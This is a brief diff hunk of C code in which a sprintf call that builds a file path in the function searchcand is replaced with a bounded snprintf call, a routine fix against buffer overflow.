@@ -166,7 +166,7 @@ static int searchcand(unsigned char *c, unsigned char *rt, int fwd, unsigned cha
         return 0;
     }
 
-    sprintf(file, INPUTFILE, c[0], c[1]);
+    snprintf(file, sizeof(file), INPUTFILE, c[0], c[1]);
 
     fd = open(file, O_RDONLY);
     if (fd <= 0) {
